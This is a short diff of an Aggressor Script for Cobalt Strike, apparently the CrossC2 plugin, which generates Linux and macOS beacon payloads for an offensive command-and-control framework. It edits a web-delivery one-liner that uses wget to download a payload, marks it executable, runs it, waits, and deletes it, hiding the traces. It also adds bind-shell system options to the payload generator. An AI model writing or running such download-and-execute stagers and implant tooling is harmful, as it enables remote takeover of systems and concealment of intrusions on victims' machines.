@@ -100,7 +100,7 @@ sub dialogCallBack {
     $targetSaveName = '.'.$targetSaveName.'';
 
     # host script
-    $script = "wget -U 'O' ".$payloadUrl." -O /tmp/".$targetSaveName." && chmod 777 /tmp/".$targetSaveName." && /tmp/".$targetSaveName." && rm -f /tmp/".$targetSaveName;
+    $script = "wget -U 'O' ".$payloadUrl." -O /tmp/".$targetSaveName." && chmod 777 /tmp/".$targetSaveName." && /tmp/".$targetSaveName." && sleep 7 && rm -f /tmp/".$targetSaveName;
     $scriptUrl = site_host($host, $lport, $uri, $script, "automatic", "Script Unix Web Delivery (curl)");
 
     # tell the user our URL
@@ -115,7 +115,7 @@ sub genCrossC2 {
     drow_text($dialog, "lport", "Web Delivery Port: ", 20);
     drow_file($dialog, "beaconKey", "Choose: default ./.cobaltstrike.beacon_keys");
     drow_file($dialog, "rebind_lib", "Choose: rebind_dynamic_lib");
-    drow_combobox($dialog, "system", "System: ", @("Linux", "MacOS", "Linux-GLIBC"));
+    drow_combobox($dialog, "system", "System: ", @("Linux", "MacOS", "Linux-bind", "MacOS-bind"));
     drow_listener($dialog, "listener", "Listener: (reverse_https)");
     drow_combobox($dialog, "arch", "Arch: ", @("x64", "x86"));
     drow_combobox($dialog, "payload_type", "Payload_Type: ", @("Stageless", "Staged"));
